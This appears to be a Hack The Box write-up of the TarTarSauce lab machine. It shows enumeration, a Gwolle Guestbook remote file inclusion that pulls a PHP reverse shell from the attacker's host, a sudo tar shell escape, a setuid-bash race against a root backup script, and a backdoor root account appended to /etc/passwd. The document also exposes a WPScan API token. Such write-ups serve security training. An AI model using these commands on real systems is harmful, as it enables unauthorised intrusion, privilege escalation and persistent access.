# Hackthebox TarTarSauce

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.1.185     
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:46 EST
Nmap scan report for 10.129.1.185
Host is up (0.032s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

Directory scanning

```
$ gobuster dir -u http://10.129.1.185 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50  
===============================================================
2022/01/03 08:46:52 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10766]
/robots.txt           (Status: 200) [Size: 208]  
/server-status        (Status: 403) [Size: 300]  
/webservices          (Status: 301) [Size: 318] [--> http://10.129.1.185/webservices/]
```

/webservices/monstra-3.0.4/ is a home for our new Monstra powered website, that does not seem to be much configured yet.

Further enumerating directory tree

```
$ gobuster dir -u http://10.129.1.185/webservices/monstra-3.0.4/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50 -x sh,txt,php,tar
===============================================================
2022/01/03 14:11:07 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 338] [--> http://10.129.1.185/webservices/monstra-3.0.4/admin/]
/backups              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/backups/]
/boot                 (Status: 301) [Size: 337] [--> http://10.129.1.185/webservices/monstra-3.0.4/boot/]   
/engine               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/engine/] 
/favicon.ico          (Status: 200) [Size: 1150]                                                            
/index.php            (Status: 200) [Size: 4366]                                                            
/index.php            (Status: 200) [Size: 4366]                                                            
/libraries            (Status: 301) [Size: 342] [--> http://10.129.1.185/webservices/monstra-3.0.4/libraries/]
/plugins              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/plugins/]  
/public               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/public/]   
/robots.txt           (Status: 200) [Size: 92]                                                                
/robots.txt           (Status: 200) [Size: 92]                                                                
/rss.php              (Status: 200) [Size: 1039]                                                              
/sitemap.xml          (Status: 200) [Size: 730]                                                               
/storage              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/storage/]  
/tmp                  (Status: 301) [Size: 336] [--> http://10.129.1.185/webservices/monstra-3.0.4/tmp/] 
```

Also for the base directory

```
$ gobuster dir -u http://10.129.1.185/webservices/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 50         
===============================================================
2022/01/03 11:01:35 Starting gobuster in directory enumeration mode
===============================================================
/wp                   (Status: 301) [Size: 321] [--> http://10.129.1.185/webservices/wp/]
```

And there is a wordpress site below /wp, and its admin page /webservices/wp/wp-login.php

## Vulnerability Scanning

Nmap vuln-scan

```
$ nmap --script vuln 10.129.1.185  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:49 EST
Nmap scan report for 10.129.1.185
Host is up (0.036s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
```

Searchsploit for Monstra

```
$ searchsploit monstra 
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 1.2.0 - 'login' SQL Injection                                                                                 | php/webapps/38769.txt
Monstra CMS 1.2.1 - Multiple HTML Injection Vulnerabilities                                                               | php/webapps/37651.html
Monstra CMS 3.0.3 - Multiple Vulnerabilities                                                                              | php/webapps/39567.txt
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                         | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                             | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                   | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                        | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                 | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                            | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                            | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                        | php/webapps/45164.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

WPScan for WordPress

```
$ wpscan --url 10.129.1.185/webservices/wp --api-token r9smSzG4RwsgpvPuUBsf1E6r90zJ14CSNgDOgPgorF4     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.129.1.185/webservices/wp/ [10.129.1.185]
[+] Started: Mon Jan  3 11:22:26 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.129.1.185/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.129.1.185/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.129.1.185/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

          ... lots of stuff ...

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.


[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

In addition the author name can be queried by calling a url 

```
http://10.129.1.185/webservices/wp/?author=1
```

It seems the plugins need to be queried using aggressive mode to detect what is installed

```
$ wpscan --url 10.129.1.185/webservices/wp --enumerate p --plugins-detection aggressive

...

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:10 <===============================================================> (1500 / 1500) 100.00% Time: 00:00:10
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-10-01T18:28:00.000Z
 | Readme: http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-12-09T08:36:00.000Z
 | Readme: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

Checking the vulnerability of Gwolle

```
$ searchsploit gwolle   
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                | php/webapps/38861.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Too bad, our version seems to be 2.3.10. However, reading file webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

```
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

= 1.5.3 =
* 2015-10-01
```

It seems we have the vulnerable version after all.

## Initial Access 

Rename a php reverse shell to wp-load.php and start up a web server. Call the webserver using url (note that the trailing slash is important)

```
http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.23:9001/
```

The file is fetched

```
$ python -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.1.185 - - [04/Jan/2022 07:35:52] "GET /wp-load.php HTTP/1.0" 200 -
```

And our listener provides us a revershe shell

```
$ nc -nvlp 1234                  
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.1.185] 55962
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 07:36:06 up  2:44,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@TartarSauce:/$ whoami
www-data
www-data@TartarSauce:/$ 
```

## Privilege Escalation www-data to onuma

Rather straightforward escalation of privileges through tar

```
ww-data@TartarSauce:/usr/sbin$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
www-data@TartarSauce:/usr/sbin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
<bin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'  
$ whoami
onuma
$
```

and capture the flag

```
numa@TartarSauce:~$ pwd
/home/onuma
onuma@TartarSauce:~$ ls -al user.txt
-r-------- 1 onuma onuma 33 Feb  9  2018 user.txt
```

## Privilege Escalation onuma to root

First see if there is anything interesting in onuma's home directory

```
onuma@TartarSauce:~$ cat .mysql_history
_HiStOrY_V2_
create\040database\040backuperer;
exit
```

Also in .nano/search_history

```
numa@TartarSauce:~/.nano$ cat search_history
cat search_history
w00t
woot
```

Both of these were just rabbit holes.

At this point I've learned to use pspy to see what is happening on the server, and there is also this time some interesting stuff happening

```
022/01/04 08:03:15 CMD: UID=0    PID=17478  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17477  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17476  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17475  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17474  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17473  | /lib/systemd/systemd-udevd 
2022/01/04 08:03:15 CMD: UID=0    PID=17472  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17489  | seq 72 
2022/01/04 08:03:15 CMD: UID=0    PID=17488  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17487  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17492  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17536  | 
...
2022/01/04 08:03:15 CMD: UID=0    PID=17540  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17541  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17542  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17544  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17546  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17547  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17549  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17551  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17552  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17553  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17554  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17556  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17558  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17559  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=0    PID=17561  | /usr/bin/printf - 
2022/01/04 08:03:15 CMD: UID=0    PID=17562  | /bin/date 
2022/01/04 08:03:15 CMD: UID=0    PID=17563  | 
2022/01/04 08:03:15 CMD: UID=0    PID=17564  | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check 
2022/01/04 08:03:15 CMD: UID=0    PID=17568  | /bin/sleep 30 
2022/01/04 08:03:15 CMD: UID=0    PID=17567  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:15 CMD: UID=1000 PID=17572  | gzip 
2022/01/04 08:03:15 CMD: UID=1000 PID=17571  | /bin/tar -zcvf /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 /var/www/html 
2022/01/04 08:03:45 CMD: UID=0    PID=17578  | gzip -d 
2022/01/04 08:03:45 CMD: UID=0    PID=17577  | /bin/tar -zxvf /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 -C /var/tmp/check 
2022/01/04 08:03:46 CMD: UID=0    PID=17580  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:46 CMD: UID=0    PID=17579  | /bin/bash /usr/sbin/backuperer 
2022/01/04 08:03:46 CMD: UID=0    PID=17581  | /bin/mv /var/tmp/.a2a36b52630e5338e648b65e1fad5e2de6664db7 /var/backups/onuma-www-dev.bak 
2022/01/04 08:03:46 CMD: UID=0    PID=17582  | /bin/rm -rf /var/tmp/check . .. 
2022/01/04 08:03:46 CMD: UID=0    PID=17583  | 
2022/01/04 08:03:46 CMD: UID=0    PID=17586  | /lib/systemd/systemd-cgroups-agent /system.slice/backuperer.service 
```

An important piece of this puzzle is most like the backuperer script

```
www-data@TartarSauce:/$ ls -al /usr/sbin/backuperer
ls -al /usr/sbin/backuperer
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
```

## Privilege Escalation onuma to root

Analysing the backuperer we can exploit its functionality combined with the fact that tar extracts keep the file and suid permissions after the extraction. We need a root level privilege to extract our root owned files, and the script does that for us.


Copy the bash file to our attacker host and create the directory tree with bash having suid bit set. The bash file can be easily transferred using wget once the file on the target has been copied to the root of the web server.

Set the suid bit and execution permissions
```
$ sudo chmod a+x bash && sudo chmod u+s bash
                                                                                                                                                                   
┌──(kali㉿kali)-[~/…/setuid/var/www/html]
└─$ ls -al
total 1092
drwxr-xr-x 2 root root    4096 Jan  4 12:08 .
drwxr-xr-x 3 root root    4096 Jan  4 12:07 ..
-rwsr-xr-x 1 root root 1109564 Jan  4 12:08 bash
```

It is important to have the directory structure in place for the backuperer script.

```
$ tree var  
var
└── www
    └── html
        └── bash

2 directories, 1 file
```

Create a tar file of the directory tree

```
$ tar -czvf suidbash.tar.gz var/                    
var/
var/www/
var/www/html/
var/www/html/bash
```

Copy the file back to target host.

Next our job is to monitor /var/tmp directory and notice the moment when the backup script starts to run. 

```
numa@TartarSauce:/var/tmp$ ls -al
ls -al
total 13788
drwxrwxrwt 10 root     root         4096 Jan  4 12:46 .
drwxr-xr-x 14 root     root         4096 Feb  9  2018 ..
-rw-r--r--  1 onuma    onuma    13045152 Jan  4 12:46 .7480d8819843ead8df61303f173e6de38d9aaf96
-rw-r--r--  1 onuma    onuma      512014 Jan  4 12:42 suidbash.tar.gz
drwx------  3 root     root         4096 Jan  4 04:52 systemd-private-0819f3c6f0a34abba10efbe040641aeb-systemd-timesyncd.service-lxIG8p
drwx------  3 root     root         4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root     root         4096 May 29  2020 systemd-private-4e3fb5c5d5a044118936f5728368dfc7-systemd-timesyncd.service-SksmwR
drwx------  3 root     root         4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
drwx------  3 root     root         4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
drwx------  3 root     root         4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
drwx------  3 root     root         4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
drwx------  3 root     root         4096 Sep 25  2020 systemd-private-e11430f63fc04ed6bd67ec90687cb00e-systemd-timesyncd.service-PYhxgX
onuma@TartarSauce:/var/tmp$ cp suidbash.tar.gz .7480d8819843ead8df61303f173e6de38d9aaf96
```

After the script executes is extracts the tar to directory 'check' and we have five minutes to execute our suid bash.

```
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -al
ls -al
total 1092
drwxr-xr-x 2 root root    4096 Jan  4 12:08 .
drwxr-xr-x 3 root root    4096 Jan  4 12:07 ..
-rwsr-xr-x 1 root root 1109564 Jan  4 12:08 bash
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./bash -p
./bash -p
bash-4.3# whoami
whoami
root
bash-4.3#
```

Now we can finally get the flag

```
root@TartarSauce:/# ls -al /root/root.txt
ls -al /root/root.txt
-r-------- 1 root root 33 Feb  9  2018 /root/root.txt
```

Also to have easier access to root level later on we can add a new user with the privileges

```
bash-4.3# openssl passwd -1 123456
$1$8z5VP0Cz$dl4f/98Ur.Dd/GegAjodl.
bash-4.3# echo 'attacker:$1$8z5VP0Cz$dl4f/98Ur.Dd/GegAjodl.:0:0:attacker:/root:/bin/bash' >> /etc/passwd
bash-4.3# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
            ...
attacker:$1$8z5VP0Cz$dl4f/98Ur.Dd/GegAjodl.:0:0:attacker:/root:/bin/bash
bash-4.3# su attacker
Password: 123456

root@TartarSauce:/home/onuma# id
id
uid=0(root) gid=0(root) groups=0(root)
```
